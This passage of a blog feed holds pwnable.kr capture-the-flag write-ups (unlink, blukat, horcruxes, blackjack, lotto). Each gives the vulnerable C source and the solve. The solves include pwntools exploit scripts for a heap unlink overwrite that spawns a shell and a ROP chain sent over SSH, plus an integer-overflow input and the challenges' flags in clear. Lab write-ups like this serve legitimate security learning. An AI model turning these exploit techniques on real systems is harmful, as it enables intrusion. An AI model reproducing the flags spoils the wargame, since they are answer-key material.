operator">&amp;</span>0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>change got.plt</p><pre class="line-numbers language-bash"><code class="language-bash">gdb-peda$ gotGOT protection: Partial RELRO <span class="token operator">|</span> GOT functions: 10<span class="token punctuation">[</span>0x804a000<span class="token punctuation">]</span> read@GLIBC_2.0 -<span class="token operator">></span> 0xf7610b00 <span class="token punctuation">(</span>read<span class="token punctuation">)</span> ◂— <span class="token function">cmp</span>    dword ptr gs:<span class="token punctuation">[</span>0xc<span class="token punctuation">]</span>, 0<span class="token punctuation">[</span>0x804a004<span class="token punctuation">]</span> printf@GLIBC_2.0 -<span class="token operator">></span> 0x80486ab <span class="token punctuation">(</span>fsb+375<span class="token punctuation">)</span> ◂— mov    eax, dword ptr <span class="token punctuation">[</span>ebp - 0x24<span class="token punctuation">]</span><span class="token punctuation">[</span>0x804a008<span class="token punctuation">]</span> sleep@GLIBC_2.0 -<span class="token operator">></span> 0x8048406 <span class="token punctuation">(</span>sleep@plt+6<span class="token punctuation">)</span> ◂— push   0x10<span class="token punctuation">[</span>0x804a00c<span class="token punctuation">]</span> puts@GLIBC_2.0 -<span class="token operator">></span> 0x8048416 <span class="token punctuation">(</span>puts@plt+6<span class="token punctuation">)</span> ◂— push   0x18<span class="token punctuation">[</span>0x804a010<span class="token punctuation">]</span> __gmon_start__ -<span class="token operator">></span> 0x8048426 <span class="token punctuation">(</span>__gmon_start__@plt+6<span class="token punctuation">)</span> ◂— push   0x20 /* <span class="token string">'h '</span> */<span class="token punctuation">[</span>0x804a014<span class="token punctuation">]</span> open@GLIBC_2.0 -<span class="token operator">></span> 0xf76106f0 <span class="token punctuation">(</span>open<span class="token punctuation">)</span> ◂— <span class="token function">cmp</span>    dword ptr gs:<span class="token punctuation">[</span>0xc<span class="token punctuation">]</span>, 0<span class="token punctuation">[</span>0x804a018<span class="token punctuation">]</span> __libc_start_main@GLIBC_2.0 -<span class="token operator">></span> 0xf7553540 <span class="token punctuation">(</span>__libc_start_main<span class="token punctuation">)</span> ◂— call   0xf765ab59<span class="token punctuation">[</span>0x804a01c<span class="token punctuation">]</span> execve@GLIBC_2.0 -<span class="token operator">></span> 0x8048456 <span class="token punctuation">(</span>execve@plt+6<span class="token punctuation">)</span> ◂— push   0x38 /* <span class="token string">'h8'</span> */<span class="token punctuation">[</span>0x804a020<span class="token punctuation">]</span> strtoull@GLIBC_2.0 -<span class="token operator">></span> 0x8048466 <span class="token punctuation">(</span>strtoull@plt+6<span class="token punctuation">)</span> ◂— push   0x40 /* <span class="token string">'h@'</span> */<span class="token punctuation">[</span>0x804a024<span class="token punctuation">]</span> close@GLIBC_2.0 -<span class="token operator">></span> 0xf7611290 <span class="token punctuation">(</span>close<span class="token punctuation">)</span> ◂— <span class="token function">cmp</span>    dword ptr gs:<span class="token punctuation">[</span>0xc<span class="token punctuation">]</span>, 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">Have you ever saw an example of utilizing <span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token function">format</span> character?? :<span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr_3</title>
      <link href="/2018/08/23/pwnable-kr-3/"/>
      <url>/2018/08/23/pwnable-kr-3/</url>
      
        <content type="html"><![CDATA[<h1 id="16-unlink"><a href="#16-unlink" class="headerlink" title="16.unlink"></a>16.unlink</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><a id="more"></a><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tagOBJ<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> fd<span class="token punctuation">;</span>  <span class="token keyword">struct</span> tagOBJ<span class="token operator">*</span> bk<span class="token punctuation">;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>OBJ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">unlink</span><span class="token punctuation">(</span>OBJ<span class="token operator">*</span> P<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  OBJ<span class="token operator">*</span> BK<span class="token punctuation">;</span>  OBJ<span class="token operator">*</span> FD<span class="token punctuation">;</span>  BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>  FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>  FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>  BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  OBJ<span class="token operator">*</span> A <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  OBJ<span class="token operator">*</span> B <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  OBJ<span class="token operator">*</span> C <span class="token operator">=</span> <span class="token punctuation">(</span>OBJ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// double linked list: A &lt;-> B &lt;-> C</span>  A<span class="token operator">-></span>fd <span class="token operator">=</span> B<span class="token punctuation">;</span>  B<span class="token operator">-></span>bk <span class="token operator">=</span> A<span class="token punctuation">;</span>  B<span class="token operator">-></span>fd <span class="token operator">=</span> C<span class="token punctuation">;</span>  C<span class="token operator">-></span>bk <span class="token operator">=</span> B<span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is stack address leak: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"here is heap address leak: %p\n"</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now that you have leaks, get shell!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// heap overflow!</span>  <span class="token function">gets</span><span class="token punctuation">(</span>A<span class="token operator">-></span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// exploit this unlink!</span>  <span class="token function">unlink</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./unlink'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'here is stack address leak: '</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'here is heap address leak: '</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x80484eb</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">12</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>stack_addr<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>heap_addr<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="17-blukat"><a href="#17-blukat" class="headerlink" title="17.blukat"></a>17.blukat</h1><h2 id="question-1"><a href="#question-1" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token string">"3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">calc_flag</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/home/blukat/password"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"congrats! here is your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">calc_flag</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong guess!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-bash"><code class="language-bash">blukat@ubuntu:~$ <span class="token function">id</span>uid<span class="token operator">=</span>1104<span class="token punctuation">(</span>blukat<span class="token punctuation">)</span> gid<span class="token operator">=</span>1104<span class="token punctuation">(</span>blukat<span class="token punctuation">)</span> groups<span class="token operator">=</span>1104<span class="token punctuation">(</span>blukat<span class="token punctuation">)</span>,1105<span class="token punctuation">(</span>blukat_pwn<span class="token punctuation">)</span>blukat@ubuntu:~$ <span class="token function">cat</span> password <span class="token operator">|</span>./blukatguess the password<span class="token operator">!</span>congrats<span class="token operator">!</span> here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm<span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="18-horcruxes"><a href="#18-horcruxes" class="headerlink" title="18.horcruxes"></a>18.horcruxes</h1><h2 id="question-2"><a href="#question-2" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-bash"><code class="language-bash">connect to port 9032 <span class="token punctuation">(</span>nc 0 9032<span class="token punctuation">)</span>. the <span class="token string">'horcruxes'</span> binary will be executed under horcruxes_pwn privilege.rop it to <span class="token function">read</span> the flag.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-bash"><code class="language-bash">from pwn <span class="token function">import</span> *context.log_level<span class="token operator">=</span><span class="token string">'debug'</span>s <span class="token operator">=</span> ssh<span class="token punctuation">(</span><span class="token string">"horcruxes"</span>, <span class="token string">"pwnable.kr"</span>, port<span class="token operator">=</span>2222, password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s.remote<span class="token punctuation">(</span><span class="token string">"localhost"</span>, 9032<span class="token punctuation">)</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./horcruxes'</span><span class="token punctuation">)</span>t<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span>,ord<span class="token punctuation">(</span><span class="token string">'G'</span><span class="token punctuation">)</span>+1<span class="token punctuation">)</span>:  t.append<span class="token punctuation">(</span>e.symbols<span class="token punctuation">[</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>addr_ropme<span class="token operator">=</span>0x0809FFFCpayload<span class="token operator">=</span><span class="token string">'a'</span>*120<span class="token keyword">for</span> i <span class="token keyword">in</span> t:  payload+<span class="token operator">=</span>p32<span class="token punctuation">(</span>i<span class="token punctuation">)</span>payload+<span class="token operator">=</span>p32<span class="token punctuation">(</span>addr_ropme<span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">'123'</span>,payload<span class="token punctuation">)</span>r.recvuntil<span class="token punctuation">(</span><span class="token string">'Select Menu:'</span><span class="token punctuation">)</span>r.sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>r.sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sum<span class="token operator">=</span>0<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>7<span class="token punctuation">)</span>:  r.recvuntil<span class="token punctuation">(</span><span class="token string">'(EXP +'</span><span class="token punctuation">)</span>  <span class="token function">sum</span> +<span class="token operator">=</span> int<span class="token punctuation">(</span>r.recvuntil<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>:-1<span class="token punctuation">]</span><span class="token punctuation">)</span>r.recvuntil<span class="token punctuation">(</span><span class="token string">"Menu:"</span><span class="token punctuation">)</span>r.sendline<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span>r.recvuntil<span class="token punctuation">(</span><span class="token string">"earned? : "</span><span class="token punctuation">)</span>r.sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sum<span class="token punctuation">))</span> r.interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="19-blackjack"><a href="#19-blackjack" class="headerlink" title="19.blackjack"></a>19.blackjack</h1><h2 id="question-3"><a href="#question-3" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bet<span class="token punctuation">;</span> <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-3"><a href="#solve-3" class="headerlink" title="solve"></a>solve</h2><p>int overflow</p><pre class="line-numbers language-bash"><code class="language-bash">Enter Bet: <span class="token variable">$1000</span>You cannot bet <span class="token function">more</span> money than you have.Enter Bet: 4293967296<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">YaY_I_AM_A_MILLIONARE_LOL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="20-lotto"><a href="#20-lotto" class="headerlink" title="20.lotto"></a>20.lotto</h1><h2 id="question-4"><a href="#question-4" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> submit<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Submit your 6 lotto bytes : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> r<span class="token punctuation">;</span>  r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> submit<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Lotto Start!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//sleep(1);</span>  <span class="token comment" spellcheck="true">// generate lotto numbers</span>  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> lotto<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> lotto<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error2. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 1 ~ 45</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// calculate lotto score</span>  <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        match<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// win!</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>match <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad luck...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span 